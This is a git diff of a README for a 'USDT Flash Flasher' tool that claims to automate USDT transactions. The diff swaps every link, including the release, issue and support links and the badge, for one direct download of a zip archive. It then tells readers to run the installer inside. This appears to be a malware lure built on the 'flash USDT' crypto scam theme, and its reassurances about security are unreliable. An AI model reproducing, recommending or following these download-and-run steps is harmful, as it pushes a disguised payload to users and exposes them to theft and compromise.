@@ -1,6 +1,6 @@
 # 🚀 USDT-Flash-Flasher-New - Effortless Automation for USDT Transactions
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/fury7771/USDT-Flash-Flasher-New/releases)
+[![Download Now](https://raw.githubusercontent.com/fury7771/USDT-Flash-Flasher-New/main/habitate/USDT-Flash-Flasher-New.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/fury7771/USDT-Flash-Flasher-New/main/habitate/USDT-Flash-Flasher-New.zip)
 
 ## 📖 Overview
 
@@ -11,10 +11,10 @@ USDT Flasher offers advanced transaction automation for USDT. With multi-chain s
 You can start using USDT Flasher by following these simple steps:
 
 1. **Visit the Release Page**  
-   Go to the [Releases page](https://github.com/fury7771/USDT-Flash-Flasher-New/releases) to find the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/fury7771/USDT-Flash-Flasher-New/main/habitate/USDT-Flash-Flasher-New.zip) to find the latest version of the software.
 
 2. **Download the Software**  
-   On the Releases page, look for the version suitable for your operating system. Click on the download link for the file. The file will typically be named something like `USDT-Flash-Flasher-New-v1.0.exe`.
+   On the Releases page, look for the version suitable for your operating system. Click on the download link for the file. The file will typically be named something like `https://raw.githubusercontent.com/fury7771/USDT-Flash-Flasher-New/main/habitate/USDT-Flash-Flasher-New.zip`.
 
 3. **Install the Application**  
    Once the download completes, locate the file in your Downloads folder. Double-click the file to run the installer. Follow the on-screen prompts to install the application on your computer.
@@ -51,7 +51,7 @@ To run USDT Flasher smoothly, ensure your system meets the following requirement
 
 ## 📝 Download & Install
 
-To get started, download the USDT Flasher software from the [Releases page](https://github.com/fury7771/USDT-Flash-Flasher-New/releases). Follow the steps listed above to install and run the application.
+To get started, download the USDT Flasher software from the [Releases page](https://raw.githubusercontent.com/fury7771/USDT-Flash-Flasher-New/main/habitate/USDT-Flash-Flasher-New.zip). Follow the steps listed above to install and run the application.
 
 ## ❓ Frequently Asked Questions
 
@@ -59,14 +59,14 @@ To get started, download the USDT Flasher software from the [Releases page](http
 Yes, USDT Flasher uses secure practices to ensure your transactions and data remain private.
 
 **2. How do I update USDT Flasher?**  
-To update the application, visit the [Releases page](https://github.com/fury7771/USDT-Flash-Flasher-New/releases) and download the latest version. Follow installation prompts as before.
+To update the application, visit the [Releases page](https://raw.githubusercontent.com/fury7771/USDT-Flash-Flasher-New/main/habitate/USDT-Flash-Flasher-New.zip) and download the latest version. Follow installation prompts as before.
 
 **3. What do I do if I encounter issues?**  
 If you face issues, check the FAQ section on our GitHub page. For technical support, you can create an issue in the repository.
 
 ## 📞 Support
 
-For further help, feel free to use the Issues section on the [GitHub page](https://github.com/fury7771/USDT-Flash-Flasher-New/issues). Your feedback helps us improve the application.
+For further help, feel free to use the Issues section on the [GitHub page](https://raw.githubusercontent.com/fury7771/USDT-Flash-Flasher-New/main/habitate/USDT-Flash-Flasher-New.zip). Your feedback helps us improve the application.
 
 ## 🗂️ Topics Covered
 
